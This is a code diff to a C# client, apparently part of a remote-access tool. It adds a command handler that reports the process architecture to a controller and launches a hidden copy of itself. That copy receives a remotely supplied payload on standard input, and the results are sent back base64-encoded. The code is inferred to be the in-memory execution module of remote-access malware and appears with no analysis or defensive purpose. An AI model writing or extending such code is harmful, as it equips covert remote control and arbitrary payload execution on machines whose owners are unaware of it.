@@ -2740,7 +2740,38 @@ namespace winClient48
                 {
                     (int nCode, string szMsg) ret = (0, string.Empty);
 
-                    if (cmd[1] == "x64")
+                    if (cmd[1] == "init")
+                    {
+                        v.fnSendCommand(new string[]
+                        {
+                            "fle",
+                            "init",
+                            Environment.Is64BitProcess ? "x64" : "x86"
+                        });
+
+                        return;
+                    }
+                    else if (cmd[1] == "x86")
+                    {
+                        var psi = new ProcessStartInfo
+                        {
+                            FileName = Process.GetCurrentProcess().MainModule.FileName,
+                            Arguments = $"--x86",
+                            UseShellExecute = false,
+                            RedirectStandardInput = true,
+                            RedirectStandardOutput = true,
+                            RedirectStandardError = true,
+                            CreateNoWindow = true,
+                        };
+
+                        var p = Process.Start(psi);
+                        p.StandardInput.Write(cmd[3]);
+                        p.StandardInput.Close();
+
+                        ret.nCode = 1;
+                        ret.szMsg = "Subprocess is started, please check.";
+                    }
+                    else if (cmd[1] == "x64")
                     {
                         var psi = new ProcessStartInfo
                         {
@@ -2783,6 +2814,15 @@ namespace winClient48
                         ret.nCode = 1;
                         ret.szMsg = "Subprocess is started, please check.";
                     }
+
+                    // "init" command cannot executes this.
+                    v.fnSendCommand(new string[]
+                    {
+                        "fle",
+                        cmd[1],
+                        ret.nCode.ToString(),
+                        clsCrypto.b64E2Str(ret.szMsg),
+                    });
                 }
 
                 #endregion
